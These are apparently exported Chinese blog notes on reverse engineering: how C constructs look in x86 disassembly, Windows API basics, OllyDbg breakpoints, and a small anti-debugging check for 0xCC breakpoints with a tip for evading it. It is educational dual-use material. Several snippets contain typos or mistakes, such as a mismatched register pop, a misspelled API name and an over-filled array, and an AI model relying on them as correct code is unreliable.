main+2Fh;\n    printf(\"%d\", argc);\n}\nreturn 0;\t//main+2Fh\n\txor eax, eax;\n```\n\n```c\nif (argc > 0){\n    \tcmp dword ptr[ebp+8], 0;\n    \tjle +42h;\n    printf(\"%d\", argc);\n    \t...;\n  +42h  pop edi;\n}\n```\n\n​\t一般先执行各类影响标志位得指令，其后是各种跳转指令，可高度怀疑它是一个 if 语句组成的单分支结构，需根据上下文具体分析。\n\n## 5.2 if else\n\n[![ssCtSJ.png](https://s3.ax1x.com/2021/01/17/ssCtSJ.png)](https://imgchr.com/i/ssCtSJ)\n\n​\tif else 语句，程序再进行流程选择时，必须经过两个分支中的一个\n\n```c\nif (argc == 0){\n    \tcmp dword ptr[ebp+8], 0;\n    \tjne 004010cd;\n    printf(\"==0\");\n}\nelse {\n    \tjmp 004010da; //执行完 if 跳过 else 语句\n    printf(\"!=0\");\t//004010cd\n}\n\t\tpop edi;\t//004010da else结束处\n```\n\n```asm\n\tjxx ELSE_BEGIN\nIF_BIGEIN:\n\t....\nIF_END:\n\tjmp ELSE_END\nELSE_BEIN:\n\t...\nELSE_END:\n```\n\n​\t以上指令序列，若ELSE_BEGIN 处之前有 jmp 指令，则可将其视为 if else 组合的双分支结构。\n\n## 5.3 if 构成的多分支流程\n\n```c\nvoid ifelseif(int argc){\n    if(argc > 0){\n        printf(\"argc > 0\");\n    }\n    else if(argc == 0){\n        printf(\"argc == 0\");\n    }\n    else{\n        printf(\"argc <= 0\");\n    }\n}\n```\n\n```asm\n\t\t\tcmp dword ptr [ebp+8], 0 ;条件一\n\t\t\tjle 0040111d\n\t\t\tpush \"argc > 0\" \n \t\t\tcall printf\n\t\t\tadd esp, 4\n\t\t\tjmp 0040113f\t\t\t;满足条件一直接结束\n0040111d:\tcmp dword ptr [ebp+8], 0;条件二\n00401121:\tjne 00401132\t\t\t\n\t\t\tpush \"argc == 0\"\n\t\t\tcall printf\n\t\t\tadd esp, 4\n\t\t\tjmp 0040113f\t\t\t;满足条件二直接结束\n00401132:\tpush \"argc <= 0\"\t\t;相当于最后的 else\n\t\t\tcall printf\n\t\t\tadd esp, 4\n0040113f:\tpop edi\n```\n\n​\t每条 if 语句都由 cmp 和 jxx 组成，else 由一个 jmp 跳转到分支结构的最后一个语句块结束地址所组成。如果发现多分支块内的某一段代码在执行前没有判定，即可定义为 else 块。\n\n[![ssdjDH.png](https://s3.ax1x.com/2021/01/17/ssdjDH.png)](https://imgchr.com/i/ssdjDH)\n\n​\t当代码中分支结构形成永远不可抵达的分支语句时，永远不会被执行，可以优化掉不参与编译处理\n\n## 5.4 switch\n\n​\t每两个 case 值之间差值小于等于6，且 case **语句大于等于4**，编译器会形成线性结构，编写代码中无需有序排列 case 值，编译器会在编译过程中对 case 线性地址进行有序排序。语句小于4时，使用switch语句没有意义，编译器会生成 if...else 之类的反汇编。\n\n​\t 若在一串连续的标号中去掉几个标号，则编译器会在表对应的位置填入 default 的地址，直接跳转至 default\n\n[![sywgNn.png](https://s3.ax1x.com/2021/01/18/sywgNn.png)](https://imgchr.com/i/sywgNn)\n\n[![sydL6S.png](https://s3.ax1x.com/2021/01/18/sydL6S.png)](https://imgchr.com/i/sydL6S)\n\n​\t获取某一变量的信息对其进行范围检查，超过 case 的最大值，则跳转条件成立，跳转目的指明了 switch 语句块的末尾或者是 default 块的首地址。后紧跟 jmp 指令，相对比例因子寻址方式，基址为地址表的首地址，说明此处是线性关系的 switch 分支结构。有时对变量做运算，对齐到 case 地址表 0 下表的代码不一定存在。\n\n## 5.5 不构成跳转表的 switch\n\n​\t非线性 switch 结构可采用制作索引表进行优化，需要两张表：case 语句块地址表（大表）、case 语句块索引表（小表）。有多少个 case 分支，地址表就有多少项；索引表保存了地址表中的下标值。两者最多都只能256（0xFF）项。由于在执行时需要通过索引表来查询地址表，会多出一次查询地址表过程。\n\n[![syB9MT.png](https://s3.ax1x.com/2021/01/18/syB9MT.png)](https://imgchr.com/i/syB9MT)\n\n​\tcase 语句块中没有任何代码情况下，索引表中也会出现相同标号，执行到它时，会顺序向下，直到发现下一个 case 语句部位空为止。所有没有代码的 case 属于一段多个 case 值共有的代码。索引表中这些 case 的对应保存位置处保存的都是这段共有代码在地址表中的下标值。\n\n[![sysDTe.png](https://s3.ax1x.com/2021/01/18/sysDTe.png)](https://imgchr.com/i/sysDTe)\n\n可参考索引表中村的下标值来恢复索引表形式的 switch 结构中的每一句 case 原型。\n\n## 5.6 判定树\n\n​\t将每个 case 值作为一个节点，从这些节点中找到一个中间值作为根节点，形成一棵二叉平衡树，每个节点为判定值，大于小于关系对应左右子树。打开 O1 选项——体积优先，编译器尽量以二叉判定树的方式来降低程序占用的体积。\n\n```c\nint nIndex = 0;\nscanf(\"%d\", &nIndex);\nswitch(nIndex){\n    case 2:printf(); \tbreak;\n    case 3:printf();\tbreak;\n    case 8:printf();\tbreak;\n        ....10 35 37 \n    case 666:printf();\tbreak;\n}\n```\n\n[![syRSzj.png](https://s3.ax1x.com/2021/01/18/syRSzj.png)](https://imgchr.com/i/syRSzj)\n\n## 5.7 do/while/for\n\n- do 循环：先执行循环体，后比较判断。\n- while：先比较判断，后执行循环体。\n- for：先初始化，再比较判断，最后执行循环体\n\n### 5.7.1 do\n\n[![s6wuGt.png](https://s3.ax1x.com/2021/01/18/s6wuGt.png)](https://imgchr.com/i/s6wuGt)\n\n​\twhile(nIndex <= nCount) 转换的汇编代码与 if 分支结构非常相似。if 语句比较是相反的，跳转地址大于当前代码的过程，是一个向下跳转的过程；do 中的跳转地址小于当前代码的地址，是一个向上跳转的过程。\n\n### 5.7.2 while\n\n​\twhile 使用两次跳转指令完成循环，由于多使用了一次跳转指令，效率相比 do 循环要低一些。\n\n[![s6BdDU.png](https://s3.ax1x.com/2021/01/18/s6BdDU.png)](https://imgchr.com/i/s6BdDU)\n\n​\t结尾地址即为条件跳转指令的目的地址，之前的一条 jmp 跳转指令，指令的目标地址为 while 循环的起始地址。while 循环结构可能会被优化成 do 循环结构，通常会被嵌套在 if 单分支结构中。\n\n### 5.7.3 for 循环\n\n​\t需要三次跳转来完成循环过程：一次条件比较循环，两次 jmp 跳转\n\n[![s66wtg.png](https://s3.ax1x.com/2021/01/18/s66wtg.png)](https://imgchr.com/i/s66wtg)\n\n[![s66gBV.png](https://s3.ax1x.com/2021/01/18/s66gBV.png)](https://imgchr.com/i/s66gBV)\n\n​\t遇到以上代码块即可判定它为一个 for 循环结构，这种结构是 for 循环独有的。计数器变量被赋初值后，利用 jmp 跳过第一次步长计算。然后通过三个跳转指令还原 for 循环各个组成部分：第一个 jmp 跳过指令之前的代码为初始部分；第一个 jmp 指令到循环条件比较处之间的代码为步长计算部分；在条件跳转指令 jxx 之后寻找一个 jmp 指令，必须是向上跳转的，目标是到步长计算的位置，jxx 和这个 jmp 之间代码即为循环语句。\n\n## 5.8 循环结构的优化\n\n​\tdo 循环结构中使用一次跳转就完成了循环功能，大大提升了程序的执行效率，do 循环执行效率最高。while 循环使用2个跳转指令，将其转换成效率最高的do循环结构，可提升 while 循环的效率。 \n\n# 0x06 函数工作原理\n\n调用过程\n\n```asm\n;保存栈底， 开辟栈空间\npush ebp\nmov ebp, esp\nsub esp, 40h\n;保留现场\npush ebx\npush esi\npush edi\n;填充栈空间\nlea edi, [ebp-40h]\nmov ecx, 10h\nmov eax, CCCCCCCCh\nrep stosd\n\n;返回值0\nxor eax, eax\n;恢复现场\npop edi\npop esi\npop edx\n;释放栈空间\nadd esp, 40h\n;检测栈平衡\ncmp ebp, esp\ncall _chkesp\t\t;chkesp 是 Debug 版独有函数\n;还原esp, ebp\nmov esp, ebp\npop ebp\nret\n```\n\nchkesp 函数原型如下\n\n```asm\njne _chkesp+3 (push off...)\nret\npush offset string \"Value of esp was not properl\"\npush offset string \"\"\npush 2Ah\npush offset string \"i386\\\\chkesp.c\"\npush 1\ncall _CrtDbgReport\nret\n```\n\n​\t若使用 O2 选项后，不会存在栈平衡检查，也可能保存环境、使用 ebp 保存当前栈底一系列操作。\n\n## 6.2 调用约定\n\n​\tC\\C++ 默认 _cdecl 调用约定，外部平衡。\n\n​\t不能只检查 ret 处是否有平衡操作就得知函数调用方式，编译器会有其他汇编指令间接对 esp 做加法，如` pop ecx `(相当于 esp+=4 ) 也可达到栈平衡效果。因此还需结合函数执行过程中使用的栈空间，与调用结束的栈平衡数进行对比，以判断是否实现参数平衡。\n\n​\t_cdecl 与 _stdcall 在参数平衡上有所不同，其余一样。经过优化后，__cdecl 调用方式的函数在同一作用域内多次使用，效率高于 stdcall，cdecl 可使用**复写传播**，而stdcall 都在函数内平衡参数，无法使用复写传播优化。\n\n```c\nvoid main(){\n    printf(\"1\");\n    printf(\"2\");\n    printf(\"3\");\n    printf(\"4\");\n}\n```\n\n```asm\npush \"1\"\ncall _printf\npush \"2\"\ncall _printf\npush \"3\"\ncall _printf\npush \"4\"\ncall _printf\nadd esp, 10h\nretn\n```\n\n## 6.3 ebp esp 寻址\n\n1. 正数标号法\n2. 负数标号法\n\n## 6.4 函数参数\n\n传参顺序为从右向左依次入栈，最先定义的参数最后入栈。采用正数标号法来表示局部变量偏移，函数参数标号和局部变量标号值都是正数，无法区分；使用负数标号法表示，可将两者区分，正数表示参数，负数表示局部变量，0值表示返回地址。\n\n​\tC/C++ 中，对函数参数的修改，实际上是对当前函数栈内参数中保存的值进行修改，与原数据没有任何关系，所以形参是实参的副本。\n\n​\tC/C++ 不定长参数函数定义：1、至少有一个参数。2、所有不定长参数类型传入都是 dword 类型。3、某一个参数中描述参数总个数或将最后一个参数赋值为结尾标记。printf 函数就是利用第一个参数来获取参数总个数，只需检查第一个参数指向的字符串包含几个 % 就可以确定其后的参数个数。\n\n## 6.5 函数返回值\n\n​\tcall 语句被执行后，会将下一条指令所在的地址压入栈作为返回地址。函数退出前，执行 ret 指令，该指令取得esp 执行内容作为函数的返回地址值更新 eip，程序的流程返回返回地址处，同时执行 esp 加4操作来释放返回地址空间。\n\n​\tVC 使用 eax 来保存返回值，大于4字节的数据将使用其他方法保存。只有基本数据类型与 sizeof(type) 小于等于4的自定义类型，浮点数的存储可参考 2.2.1。Debug 版下，若有返回值，通过对 eax 赋值后执行 ret 指令。\n\n​\t若返回类型超过4字节，如有两个 int 类型的结构体，则会使用 eax 和 edx 来传递返回值。\n\n# 0x07 变量在内存中的位置和访问方式\n\n## 7.1 全局变量和局部变量区别\n\n​\t常量和全局变量有相似特征，在程序执行前就存在，PE 文件中的只读数据节中，常量的节属性被修饰为不可写；全局变量和静态变量在属性为可读写的数据节。\n\n​\t具有初始值的全局变量，其值在链接时被写入创建的 PE 文件中，当用户执行该文件，操作系统线分析 PE 中的数据，将各节中的数据填入对应虚拟内存地址，这时全局变量就已经存在。等 PE 分析和加载完成才开始执行入口点的代码。全局变量不受作用域影响，在程序中任何位置都可被访问和使用，可被赋值和修改。当程序结束运行退出后，全局变量将被销毁。\n\n​\t访问全局变量与访问常量类似——都是通过立即数来访问，编译器在编译过程中可以给全局变量计算出一个固定的地址值。局部变量需要进入作用域，通过申请栈空间存放，利用栈指针 ebp 或 esp 间接访问，编译器无法预先计算。\n\n​\t全局变量在内存中的地址顺序时先定义变量在低地址，后定义变量在高地址。\n\n## 7.2 局部静态变量\n\n​\t全局静态变量与全局变量类似，全局静态变量只能在本文件中使用，但只在编译之前做相应的语法检查，在反汇编代码中两者一样。\n\n​\t局部静态变量未进入作用域之前就存在，生命周期与全局变量相同。两者都保存在文件数据区中，局部变量会被预先作为全局变量处理，他的初始化部分只是做赋值操作。当某函数被频繁调用时，C++ 规定局部静态变量只被初始化一次。\n\n```c\n#include<stdio.h>\n\nvoid Show(int Num)\n{\n    static int num = Num;\n    printf(\"%d\\n\", num);\n}\n\nint main()\n{\n    for(int i = 0; i < 5; i++)\n        Show(i);\n    return 0;\n}\n```\n\n上述程序输出五个0\n\n```asm\n;Show 函数\nxor eax, eax\nmov al, [004257cc]\nand eax, 1\ntest eax, eax\njne 0040DFE\t\t; eax最低位不为0，则表示已经被修改过\n\nmov cl, byte ptr [004257cc]\nor cl, 1\t\t;最低位置1，表示修改过\nmov edx, dword ptr [ebp+8]\nmov dword ptr [004257c8], edx\t;局部静态变量地址处写入修改值\n\nmov eax, [004257c8]\t;0040DFE\n```\n\n​\t004257cc 保存局部静态变量的一个标志，占一字节。通过位运算，将标志中一位数据置1，以此判断是否已经被初始化过。由于一个静态变量只用了一位，这个标志可以同时表示8个局部静态变量初始状态。这个标志位定义在局部静态变量地址附近，根据此标志位区分全局变量与局部静态变量。\n\n​\t当局部变量被初始化位一个常量值时，这个局部静态变量在初始化的过程中不会产生任何代码。\n\n​\t初始化的数值为常量，多次初始化不会产生变化，这样编译器会直接以全局变量方式处理，但仍然不可以超出作用域访问。通过**名称粉碎法**，在编译器将静态变量重新命名。\n\n## 7.3 堆变量\n\n​\tC/C++ 使用 malloc 与 new 实现堆空间申请，返回申请的堆空间地址；对应使用 free 与 delete 完成堆空间释放，若首地址丢失将无法释放堆空间，导致内存泄漏。\n\n​\t申请堆空间过程中调用了函数 _heap_alloc_dbg，使用 _CrtMemBlockHeader 结构描述了堆空间中的各个成员，其中定义了前指针 pBlockHeaderPrev 和后指针 pBlockHeaderNext，通过这两个指针遍历程序中申请的所有堆空间。成员 lRequest 记录当前堆是第几次申请的。\n\n​\t申请函数返回地址为堆首地址，该地址 -4 为 0xFDFDFDFD，往上越界的检查标志，-8 表示第几次申请堆操作，说明之前多次申请堆空间。下图为堆空间在内存中的表现形式。\n\n[![sxIzv9.png](https://s3.ax1x.com/2021/01/27/sxIzv9.png)](https://imgchr.com/i/sxIzv9)\n\n\n\n# 0x08 数组和指针寻址\n\n## 8.1 函数内数组\n\n​\t拥有局部变量所有特性，在内存中线性连续存储，由低地址到高地址，数组名称表示数组首地址。判断在内存中是否连续且类型是否一致，均符合即可将此段数据视为数组。\n\n​\t字符串本身就是数组，该数组最后一个数据统一使用0作为字符串结束符。字符数组初始化是复制字符串的过程，每次复制4字节的数据。两个内存间的数据传输借用寄存器。若字符串长度步位4的倍数，只要在最后一次不等于4字节的数据复制过程中按byte或者word方式复制即可。\n\n[![sz6Uc6.png](https://s3.ax1x.com/2021/01/27/sz6Uc6.png)](https://imgchr.com/i/sz6Uc6)\n\n## 8.2 数组作为参数\n\n​\t数组作为函数形参时，函数参数中保存的是数组的首地址，是一个指针变量。\n\n[![szcHde.png](https://s3.ax1x.com/2021/01/27/szcHde.png)](https://imgchr.com/i/szcHde)\n\n[![szcGqS.png](https://s3.ax1x.com/2021/01/27/szcGqS.png)](https://imgchr.com/i/szcGqS)\n\n​\trepne scasb指令，用于扫描字符串，计算字符串的长度\n\n```asm\ncld\nrepne scasb\n;等价为\nscans:inc edi\n    dec ecx\n    je loopdone\n    cmp byte [edi-1],al\n    jne scans\nloopdone:\n```\n\n## 8.3 数组作为返回值\n\n​\t当数组为局部变量数据时，当退出函数需要平衡栈，局部变量可能在其他函数调用过程中产生的栈操作将其数据破坏，将导致函数返回结果有不确定性。\n\n```c\nchar* Show()\n{\n\tchar bbb[]={\"Hello woroo\"};\n\t//printf(\"%s\", aaa);\n\treturn bbb;\n}\n\nint main(int argc, char* argv[])\n{\n\tchar* arr;\n\tarr = Show();\n\tprintf(\"%s\\n\", arr);\n\treturn 0;\n}\n```\n\n输出结果，因为返回数组的地址所存内容被 printf 函数中的栈操作修改\n\n[![szOavT.png](https://s3.ax1x.com/2021/01/27/szOavT.png)](https://imgchr.com/i/szOavT)\n\n要避免该错误，可以使用全局数组、静态数组或者是上层调用函数中定义的局部数组\n\n​\t静态数组在全局情况下与全局数组相同，作为局部作用域定义时，同样会检查对应的标志位，但无论局部静态数组有多少个元素，也只会检查以此初始化标志位。\n\n[![szzC0U.png](https://s3.ax1x.com/2021/01/27/szzC0U.png)](https://imgchr.com/i/szzC0U)\n\n## 8.4 下标寻址和指针寻址\n\n​\t数组访问方法，指针寻址效率比下标寻址低，指针寻址先取出指针变量中的数据，再用此数据进行地址偏移计算的到目标数组，从而寻址到目标数据。\n\n​\t指针寻址需要两次以上间接访问才可以得到数据，如果第一次间接访问得到的值作为地址，则必然存在指针。下标寻址由于数组元素长度固定，会产生常量折叠，不会出现二次寻址现象。\n\n## 8.5 多维数组\n\n## 8.7 指向数组指针变量\n\n```c\n//指向一维数组：类型 (*指针变量名称) [一维数组大小]\nchar a[2][10]={{\"hello\"},{\"world\"},{\"!\\r\\n\"}};\nchar (*ptr)[10] = a;\n//三维\nint arr[2][3][4];\nint (*p)[3][4] = arr;\n```\n\n​\t定义指针数组，只有最高维度可以省去。指针在地址便宜过程中需要计算出偏移量，需要所指向的数据类型来配合计算偏移长度。在多维数组中，将最高维看做一维数组，其后数据为这个一维数组个元素的数据类型。\n\n> int a[3] [4] [5] 同 int [4] [5] a[3] 一样，int [4] [5] 看做一个整体的数据类型，记作 int (*p)[4] [5] = a。 括号是为了与**指针数组**进行区分\n\n## 8.8 函数指针\n\n```\n返回类型 ([调用约定] * 函数指针变量名称) (参数信息)\n```\n\n```c\nvoid show(){\n    printf();\n}\nvoid main()\n{\n    void (_cdecl *pshow)(void) = show;\t//函数指针赋值\n    pshow();\n    show();\n}\n```\n\n​\t函数指针调用需要取出指针变量保存的地址数据，间接调用函数。函数指针保存的地址数据为代码段内的地址信息，非数据区，不存在偏移的情况。编译器不允许堆函数指针类型变量执行加法和减法等无意义操作。\n\n2021.01.29"},{"title":"加密与解密","url":"/2021/01/02/加密与解密/","content":"\n# 0x01 basic knowledge\n\n## what？\n\n### 1.1 逆向分析技术\n\n1. 通过软件使用说明和操作格式\n2. 静态分析\n3. 动态分析\n   - 粗跟踪：大块跟踪，遇到 CALL、REP、LOOP等一般不跟入。了解Win32 API 根据情况合适选择断点。\n   - 细跟踪关键部分：粗跟踪获取核心模块和程序段，再进行具体跟踪。\n\n## 1.2 文本字符\n\n### 1.2.1 ASCII 与 Unicode\n\n​\tAscii 是7位编码标准，00h~7Fh，26个小写字母和26个大写字母、10个数字、32个符号、33个控制代码及空格，共128个代码。厂商扩充128附加字符，但其中部分不统一。如 ANSI、Symbol、OEM 等字符集，**ANSI 是系统预设的标准文字存储格式。**\n\n​\tUnicode 是 ASCII 字符编码扩展，在 win 中用两Byte进行编码，称为宽字符集widechars。Unicode 是双字节编码机制的字符集，0~65535 双字节无符号整数对每个字符进行编码。Unicode 所有字符都是16位，7位的 ASCII 码被扩充为16位。\n\n```\n#ascii\n70h 65h 64h\n#Unicode\n0070h 0065h 0064h\n```\n\n​\tIntel 处理器在内存中将一个字存入存储器要占用相继的2字节，按 Little-endian （低字节）方式存入，高位字节存入高地址。\n\n[![rq6Mw9.png](https://s3.ax1x.com/2020/12/30/rq6Mw9.png)](https://imgchr.com/i/rq6Mw9)\n\n### 1.2.2 字节存储顺序\n\n- Big-endian：高位字节存入低地址，低地址存入高地址。\n- Little-endian：低位字节存入低地址，高位地址存入高地址。\n\n例如：12345678h 写入以 1000h 开始的内存中\n\n[![rq6dwd.png](https://s3.ax1x.com/2020/12/30/rq6dwd.png)](https://imgchr.com/i/rq6dwd)\n\n[![rq6BFI.png](https://s3.ax1x.com/2020/12/30/rq6BFI.png)](https://imgchr.com/i/rq6BFI)\n\n一般 x86 系列 CPU 都是 Little-endian 字节序，PowerPC 通常是 Big-endian 字节序。网络协议也采用 Big-endian 方式传输数据，所以称为网络字节序。\n\n## 1.3 Windows\n\n### 1.3.1 API\n\nApplication Programming Interface（应用程序编程接口）。提供窗口管理、图形设备接口、内存管理等服务功能，以函数库形式组织在一起，形成 Windows 应用程序编程接口，Win API。Win API 子系统负责讲 API 调用转换成 Windows 操作系统的系统服务调用。API 下面是 Windows 操作系统核心，上面是 Windows 应用程序。\n\n[![rqfio4.png](https://s3.ax1x.com/2020/12/30/rqfio4.png)](https://imgchr.com/i/rqfio4)\n\n​\t16位 Windows 的 API 称作“Win16”，用于32、64位 Windows 的 API 称作“Win32”，其中64位 API 的名称和基本功能没变，只是用64位代码实现。Win API 是基于 C 语言接口，但可由不同语言编写的程序调用。\n\n​\t32位系统调用 Win16 函数要经过转换层转换位 Win32 函数，反之相同。\n\n​\tWindows 运作核心是 DLL，16位 win 中位于 \\WINDOWS\\SYSTEM；32位 win 中位于 \\SYSTEM 和 \\SYSTEM32 中。早期只需在三个 DLL 中实现 Win 主要部分：\n\n- Kernel（Kernel32.DLL）：操作系统核心功能服务，进程与线程控制、内存管理、文件访问等。\n- User（USER32.DLL）：处理用户接口，包括键鼠输入、串口和菜单管理等。\n- GDI（GDI32.DLL）：图像设备接口，允许程序在屏幕和打印机上显示文本和图形。\n\n---\n\n​\t向 Windows 函数传一个 ANSI 字符串，会先将 ANSI 字符串转换成 Unicode 字符串，再传给操作系统；若希望函数返回 ANSI 字符串，系统会先将 Unicode 字符串转换成 ANSI 字符串，然后再返回程序。\n\n​\tWin32 API 函数字符集中，**A** 表示 ANSI，**W** 表示 Widechars(Unicode)。前者是常使用的单字节方式；后者是宽字节方式，以便处理双字节字符。每个以字符串位参数的 Win32 函数在操作系统中都有这两种方式的版本。\n\n### 1.3.2 WOW64\n\n​\tWindows-on-Windows64-bit 是64位 Windows 上的子系统，可使 32 位应用程序在不修改的情况下运行在64位操作系统上。64位系统文件放在 System32 文件夹中，还增加了 \\Windows\\SysWOW64 文件夹来存储32位系统文件。\n\n​\t加载32位程序时，WOW64 建立32位 ntdll.dll 要求的启动环境，切换 CPU 模式至32位，开始执行32位加载器。**WOW64 会对32位 ntdll.dll 的调用重定向 ntdll.dll(64位)**，而不是发出原生32位系统调用指令。WOW64 转换到原生64位模式，获取系统调用有关参数，发出对应原生64位系统调用。\n\n### 1.3.3 Windows 消息机制\n\n​\tWindows 是一个消息驱动式系统。Windows 消息提供通信手段，应用程序想要实现的功能由消息触发，通过对消息的响应和处理来完成。\n\n- 系统消息队列\n- 应用程序 消息队列\n\n​\t所有输入设备由 Windows 监控。事件发生时，WIndows先将输入的消息放入系统消息队列，再将输入的消息复制到相应的应用程序队列中，应用程序中的消息循环在它的消息队列中检索每个消息并发送给对应的窗口函数。无论事件急缓，总按先后排队（一些系统消息除外），可能导致外部实时事件得不到及时处理。\n\n### 1.3.4 虚拟内存\n\n​\t32位系统地址空间为 4GB 以内，00000000h~FFFFFFFFh，代码和数据都放在同意地址空间中，不区分代码段和数据段。\n\n​\t虚拟内存 virtual memory 通过映射 map 的方法使可用虚拟地址 virtual address 达到 4GB，每个应用程序都可以获得 2GB 的虚拟地址，剩下 2GB 系统自用。\n\n​\t应用程序不会直接访问物理地址，虚拟内存管理器通过虚拟地址的访问请求来控制所有物理地址访问。每个应用程序都有独立的 4GB 寻址空间，彼此隔离。DLL 程序没有私有空间，总时背映射到其他应用程序地址空间中，作为其他应用程序的一部分运行，DLL 不与其他程序处于同一地址空间，应用程序就无法调用它。\n\n# 0x02 动态分析技术\n\n## 2.1OD 调试器\n\n### 2.1.3 基本操作\n\n[![rOPUpj.png](https://s3.ax1x.com/2020/12/30/rOPUpj.png)](https://imgchr.com/i/rOPUpj)\n\n### 2.1.4 常用断点\n\n#### 1.INT3\n\n​\tbp 命令或者 F2 快捷键来设置/取消断点。执行 INT3 断点，该地址内容被 INT3 指令替换。INT3 指令机器码是 0xCC，被调试进程执行 INT3 指令导致一个异常时，调试器会捕捉到这个异常，从而停在断点处，然后将断点处指令恢复原来指令。\n\n​\t优点是可以设置无数个断点，缺点是改变原程序机器码，易被软件检测。为防范 API 被下断点，一些软件会检测 API 首地址是否为 0xCC。将断点设在函数内部或末尾可绕过该检测方法。\n\n```c\nFARPROC Uaddr;\nBYTE Mark= = 0;\n(FARPROC&) Uaddr = GetProAddress(LoadLibrary(\"user32.dll\"),\"MessageBox\");\nMark = *((BYTE*)Uaddr);\nif(Mark == 0xCC)\n    return true;\n```\n\n#### 2.硬件断点\n\n与 DRx 调试寄存器有关。\n\n[![sCoQUg.png](https://s3.ax1x.com/2021/01/04/sCoQUg.png)](https://imgchr.com/i/sCoQUg)\n\n- DR0~DR3：调试地址寄存器，用于保存需要监视的地址，如设置硬件断点。\n- DR4~DR5：保留\n- DR6：调试寄存器组状态寄存器。\n- DR7：调试寄存器组控制寄存器。\n\n​\t硬件断点原理是使用 DR0~DR3 设定地址，并使用 DR7 设定状态，最多设置 4 个断点。硬件执行断点与  CC 断点作用一样，但不会修改指令首字节，更难检测，速度更快。\n\n#### 3. 内存断点\n\n​\t原理是对所设的地址赋予不可访问/不可写属性，当访问/写入的时候就会产生异常。OD 截获异常后，比较是不是断点地址，是就中断。考虑执行效率，只能下一个内存断点。在内存也可对代码右键下内存断点。\n\n#### 4. 内存访问一次性断点\n\n​\talt+m 显示内存，set break-on-access（访问上设置断点） 用于对整个内存块设置该类断点，该断点是一次性的，当所在段被读取或执行时就会中断。向捕捉调用或返回某个模块（如脱壳）就显得很有用。\n\n#### 5. 消息断点\n\n​\t当某个特定窗口函数接收到特定消息时，消息断点将程序中断。只有在窗口被船舰之后才能被设置并拦截消息。\n\n​\t用户在窗口的操作，消息会发送给当前窗体。所有发送的消息有4个参数，包括1个窗口句柄 hwnd，一个消息编号 msg 和2个 long 的参数。win 可通过句柄来标识它代表的对象。\n\n​\t查看 od 中的 windows 窗口，列出相关参数，可右键选中执行 Message breakpoint on ClassProc，再根据消息类型设置拦截的消息。之后回到进程界面进行对应操作会中断在 Windows 系统代码中，此时可在 .text 段下内存断点可回到应用程序代码。\n\n#### 6. 条件断点\n\n​\t满足一定条件才会中断称为条件断点，可按寄存器、存储器、消息等设断点。调试器遇到此类断点时，计算表达式的值，结果非零或者表达式有效，则中断。\n\n- 按寄存器条件中断：快捷键 shift+F2，输入 eax==04000000 或 bp addr eax==04000000\n- 按存储器条件中断：根据对应地址存储的对应内容来判断中断，如 bp CreateFileA,[STRING [esp+4]]==\"c:\\\\1212.txt\"\n\n#### 7. 条件记录断点\n\n​\t除了条件断点作用，还能记录断点处函数表达式或参数的值，也可设置通过断点的次数，每次负荷中断条件，计数器值减一。shift+F4 打开条件记录，可设置条件\n\n[![siQIwd.png](https://s3.ax1x.com/2021/01/04/siQIwd.png)](https://imgchr.com/i/siQIwd)\n\n[![sil2As.png](https://s3.ax1x.com/2021/01/04/sil2As.png)](https://imgchr.com/i/sil2As)\n\n### 2.1.5 插件\n\n![image-20210104192741409](C:\\Users\\leehung\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210104192741409.png)\n\n### 2.1.8 调试符号\n\n​\t被调试程序二进制信息与源程序信息之间的桥梁，在编译器将源文件编译为可执行程序过程中为支持调试而摘录的调试信息，包括变量、类型、函数名、源代码行等。\n\n# 0x03 静态调试\n\n## IDA\n\n#### 3.3.16 IDC 脚本\n\n​\t在IDA中按下 shift + F2 可调出脚本编辑器，可以简单的学习一下IDA IDC脚本的编写与使用，IDC脚本借鉴的C语言的语法，具体参考 [IDA 中的IDC脚本编写笔记](https://www.cnblogs.com/LyShark/p/13100048.html)\n\n# 0x04 逆向分析技术\n\n## 4.1 32位软件逆向\n\n### 4.1.1 启动函数 \n\n​\t编写 Win32 应用必须在源码实现一个 WinMain 函数。但并不是从 WInMain 函数开始执行，首先被执行的是启动函数的相关代码，这段由编译器生成。启动代码初始化进程完成后，才会调用 WinMain 函数。\n\n​\tC/C++ 程序运行时，启动函数作用基本相同，包括检索指向新进程的命令行指针、检索指向新进程的环境变量指针、全局变量初始化和内存栈初始化等。\n\n### 4.1.2 函数\n\n#### 1. 函数的识别\n\n​\t编译器使用 call 和 ret 指令来调用函数及返回调用位置。call 指令给出被调用函数的起始地址：ret 指令用于结束函数的执行。可通过两者来识别函数。\n\n#### 2. 函数的参数\n\n​\t栈方式、寄存器方式、全局变量进行隐含参数传递的方式。\n\n**栈传递参数**\n\n​\tesp 指向栈中第一个可用数据项，调用函数时，参数依次入栈，再调用函数。调用后，再栈中取得数据并计算。计算结束后，由调用者或者被调用者平衡栈数据。\n\n[![sZvQhQ.png](https://s3.ax1x.com/2021/01/07/sZvQhQ.png)](https://imgchr.com/i/sZvQhQ)\n\n详情可见 [常见函数调用约定](https://bbs.pediy.com/thread-224583.htm)。\n\n​\t函数对参数的存取及局部变量都是通过栈来定义的，非优化编译器用一个专门的寄存器（通常是 ebp）对参数进行寻址。\n\n- 调用者将函数执行完毕时返回的地址、参数入栈。\n- 子程序使用 “ebp指针+偏移量” 对栈中的参数进行寻址并取出，完成操作。\n- 子程序使用 ret 或 retf 指令返回。CPU 将 eip 置为栈中保存的返回地址，并继续执行他。\n\nstdcall 约定 test2(Par1, Par2)，汇编代码大致如下：\n\n```asm\npush par2\npush par1\ncall test2\n{\n\tpush ebp\n\tmov ebp, esp\n\tmov eax, dword ptr [ebp+0C]\n\tmov ebx, dword ptr [ebp+08]\n\tsub esp, 8\t\t\t\t\t;为局部变量留出空间\n\t...\n\tadd esp, 8\t\t\t\t\t;释放局部变量空间\n\tpop ebp\n\tret 8\t\t\t\t\t\t;值为参数个数×4\n}\n```\n\n[![seDefA.png](https://s3.ax1x.com/2021/01/07/seDefA.png)](https://imgchr.com/i/seDefA)\n\nenter 指令相当于 push ebp; mov ebp, esp\n\nleave 指令相当于 add esp, xxx; pop edp\n\n**寄存器传递参数**\n\n​\t如 Fastcall，VC++ 中，左边两个不大于4字节的参数分别放在 ecx 和 edx 中，之后的参数从右往左压栈，由被调用函数清理栈。\n\n​\tThiscall 是 C++ 中非静态成员函数的默认调用对象，对象的每个函数隐含接收 this 参数。参数从右往左顺序入栈，由被调用函数清理栈，仅通过 ecx 传递 this 指针。\n\n```c++\nclass Csum\n{\n\tpublic:\n\tint Add(int a, int b)\t//Add(this, int a, int b)\n\t{\n\t\treturn (a+b);\n\t}\n};\nvoid main()\n{\n\tCSum 